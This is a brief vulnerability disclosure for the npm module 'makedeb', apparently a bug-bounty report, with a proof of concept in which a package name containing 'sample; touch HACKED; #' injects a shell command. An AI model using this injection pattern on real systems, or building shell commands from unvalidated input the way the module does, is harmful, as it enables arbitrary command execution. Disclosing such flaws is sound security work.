# Description

The `makedeb` module is vulnerable against `RCE` since a command is crafted using `user inputs` not validated and then executed, leading to `arbitrary command injection`

# POC

1. Create the following PoC file:

```js
// poc.js
var makedeb = require('makedeb');
makedeb({ packageName: 'sample; touch HACKED; #', version: '1.2.3', 'buildDir':'.', 'installPath':process.cwd()});

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i makedeb # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
